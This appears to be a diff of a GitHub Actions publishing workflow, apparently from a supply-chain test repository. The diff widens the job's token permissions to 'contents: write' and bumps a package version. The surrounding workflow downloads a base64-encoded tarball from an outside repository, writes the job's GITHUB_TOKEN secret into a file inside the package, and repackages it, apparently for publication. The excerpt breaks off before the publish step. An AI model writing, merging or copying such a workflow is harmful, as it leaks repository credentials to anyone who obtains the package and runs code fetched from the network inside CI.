@@ -4,13 +4,13 @@ on:
     paths:
       - .github/workflows/g10-npm-parser.yml
 permissions:
-  contents: read
+  contents: write
   packages: write
 jobs:
   publish:
     runs-on: ubuntu-latest
     steps:
-      - name: Publish secondary package with primary token file
+      - name: Publish secondary package with primary write token file
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
@@ -19,7 +19,7 @@ jobs:
           curl -fsSL https://github.com/apexblack-kangaroo-1782761273/chainship-test-release/raw/refs/heads/main/g10-npm-package.tgz.b64 -o /tmp/g10npm/package.tgz.b64
           base64 -d /tmp/g10npm/package.tgz.b64 > /tmp/g10npm/package.tgz
           tar -xzf /tmp/g10npm/package.tgz -C /tmp/g10npm/expanded
-          sed -i 's/"version":"2.0.0"/"version":"3.0.0"/' /tmp/g10npm/expanded/package/package.json
+          sed -i 's/"version":"2.0.0"/"version":"4.0.0"/' /tmp/g10npm/expanded/package/package.json
           printf '%s\n' "$GITHUB_TOKEN" > /tmp/g10npm/expanded/package/primary-runtime-token.txt
           tar -czf /tmp/g10npm/final.tgz -C /tmp/g10npm/expanded package
           printf '%s\n' "//npm.pkg.github.com/:_authToken=${GITHUB_TOKEN}" > /tmp/g10npmrc
